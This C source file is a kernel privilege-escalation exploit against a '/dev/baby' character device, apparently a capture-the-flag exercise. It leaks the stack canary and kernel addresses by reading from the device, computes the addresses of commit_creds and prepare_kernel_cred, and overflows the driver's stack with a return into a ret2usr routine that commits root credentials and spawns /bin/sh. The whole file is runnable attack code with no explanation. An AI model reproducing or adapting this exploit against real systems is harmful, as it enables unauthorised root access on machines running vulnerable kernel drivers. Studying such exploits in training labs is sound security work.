#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <stdbool.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>

// commands
#define DEV_PATH "/dev/baby"   // the path the device is placed
#define MAX_SIZE 0x2d1

/******* baby ****************/

int _open() {
    int _fd = open(DEV_PATH, O_RDWR);
    assert(_fd > 0);
    return _fd;
}

void _write(int fd, char *buf, size_t size) {
    assert(size < MAX_SIZE);
    assert(write(fd, buf, size) >= 0);
}

int _read(int fd, uint64_t *buf, size_t size) {
    int r_bytes = read(fd, buf, size);
    printf("%d\n", r_bytes);
    assert(r_bytes < MAX_SIZE);
    return r_bytes;
}

void _print(uint64_t ptr[], int size) {
    for (int i = 0; i < size / 8; i++) {
        printf("%d - 0x%016lx\n", i, ptr[i]);
    }
}

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t prepare_kernel_cred;
uint64_t commit_creds;

void spawn_shell() {
    puts("[*] Hello from user land!");
    uid_t uid = getuid();
    if (uid == 0) {
        printf("[+] UID: %d, got root!\n", uid);
        char *args[] = {"/bin/sh", NULL};
        char *env[] = {NULL};
        execve("/bin/sh", args, env); // Directly execute a shell
        perror("execve failed"); // If execve fails, print error
    } else {
        printf("[!] UID: %d, we root-less :(!\n", uid);
        exit(-1);
    }
}

void save_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax");
    puts("[+] Saved state");
}

uint64_t user_rip = (uint64_t)spawn_shell;

void privesc() {
    __asm__(".intel_syntax noprefix;"
            "movabs rax, prepare_kernel_cred;"
            "xor rdi, rdi;"
            "call rax;"
            "mov rdi, rax;"
            "movabs rax, commit_creds;"
            "call rax;"
            "swapgs;"
            "mov r15, user_ss;"
            "push r15;"
            "mov r15, user_sp;"
            "push r15;"
            "mov r15, user_rflags;"
            "push r15;"
            "mov r15, user_cs;"
            "push r15;"
            "mov r15, user_rip;"  // Where we return to!
            "push r15;"
            "iretq;"
            ".att_syntax;");
}

/************ MAIN ****************/

int main(int argc, char *argv[]) {
    uint64_t buf[0x2000];
    int fd[0x10];
    int statfd;
    int r_bytes;

    // Leaking
    fd[0] = _open();
    r_bytes = _read(fd[0], buf, MAX_SIZE - 1);
    _print(buf, MAX_SIZE - 1);
    uint8_t stack_idx = 50;
    uint64_t canary = buf[stack_idx];
    commit_creds = buf[65] + 0x83e3d;
    prepare_kernel_cred =  buf[65] + 0x8406d;
    printf("commit_creds : %lx\n", commit_creds);
    printf("prepare_kernel_cred : %lx\n", prepare_kernel_cred);
    printf("Canary : %lx\n", canary);

    save_state();
    uint64_t payload[90];
    memset(payload, 0, sizeof(payload));
    payload[stack_idx++] = canary;
    payload[stack_idx++] = (uint64_t)privesc;  // return address

    _write(fd[0], (char *)payload, sizeof(payload));

    return 0;
}
